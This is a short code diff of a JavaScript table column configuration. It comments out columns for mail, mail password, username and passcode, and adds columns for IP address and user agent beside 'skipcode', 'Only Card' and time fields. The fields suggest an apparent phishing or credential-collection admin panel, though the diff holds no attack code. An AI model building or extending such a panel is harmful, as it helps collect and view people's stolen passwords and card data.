@@ -23,31 +23,30 @@ export const collectionColumn = [
     accessor: "skipcode",
     width: "auto",
   },
-  {
-    Header: "Mail",
-    accessor: "mail",
-    width: "auto",
-    // minWidth: 100,
-  },
-  {
-    Header: "mail Password",
-    accessor: "mailPass",
-    width: "auto",
-    minWidth: 160,
-  },
-  {
-    Header: "Username",
-    accessor: "username",
-    width: "auto",
-    // minWidth: 150,
-  },
-  {
-    Header: "Passcode",
-    accessor: "passcode",
-    width: "auto",
-    // minWidth: 150,
-  },
-
+  // {
+  //   Header: "Mail",
+  //   accessor: "mail",
+  //   width: "auto",
+  //   // minWidth: 100,
+  // },
+  // {
+  //   Header: "mail Password",
+  //   accessor: "mailPass",
+  //   width: "auto",
+  //   minWidth: 160,
+  // },
+  // {
+  //   Header: "Username",
+  //   accessor: "username",
+  //   width: "auto",
+  //   // minWidth: 150,
+  // },
+  // {
+  //   Header: "Passcode",
+  //   accessor: "passcode",
+  //   width: "auto",
+  //   // minWidth: 150,
+  // },
   {
     Header: "Only Card",
     accessor: "onlyCard",
@@ -84,6 +83,17 @@ export const collectionColumn = [
         )}
       </div>
     ),
+  },
+  {
+    Header: "Ip",
+    accessor: "ip",
+    width: "auto",
+  },
+  {
+    Header: "Agent",
+    accessor: "agent",
+    // width: "auto",
+    minWidth: 500,
   },
   {
     Header: "Time",
